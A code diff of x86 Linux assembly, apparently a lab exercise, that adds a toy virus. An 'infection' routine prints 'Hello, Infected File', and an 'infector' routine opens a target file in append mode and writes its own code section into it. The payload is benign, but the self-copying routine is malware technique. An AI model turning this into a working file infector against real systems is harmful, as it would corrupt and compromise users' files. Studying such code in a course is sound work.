@@ -1,12 +1,16 @@
+section .rodata
+virus_msg db "Hello, Infected File", 10
+
 section .text
 global _start
 global system_call
-global infect_file
+global infection
+global infector
 extern main
+
 _start:
     pop    dword ecx    ; ecx = argc
     mov    esi,esp      ; esi = argv
-    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
     mov     eax,ecx     ; put the number of arguments into eax
     shl     eax,2       ; compute the size of argv in bytes
     add     eax,esi     ; add the size to the address of argv 
@@ -40,12 +44,52 @@ system_call:
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
 
-infect_file:
+code_start:
+
+infection:
     push    ebp
     mov     ebp, esp
     pushad
+
+    mov     eax, 4
+    mov     ebx, 1
+    mov     ecx, virus_msg
+    mov     edx, 21
+    int     0x80
 
     popad
     mov     esp, ebp
     pop     ebp
     ret
+
+infector:
+    push    ebp
+    mov     ebp, esp
+    pushad
+
+    mov     eax, 5
+    mov     ebx, [ebp+8]
+    mov     ecx, 1025
+    mov     edx, 0644o
+    int     0x80
+
+    cmp     eax, 0
+    jl      .error
+    mov     ebx, eax
+
+    mov     eax, 4
+    mov     ecx, code_start
+    mov     edx, code_end
+    sub     edx, ecx
+    int     0x80
+
+    mov     eax, 6
+    int     0x80
+
+.error:
+    popad
+    mov     esp, ebp
+    pop     ebp
+    ret
+
+code_end:
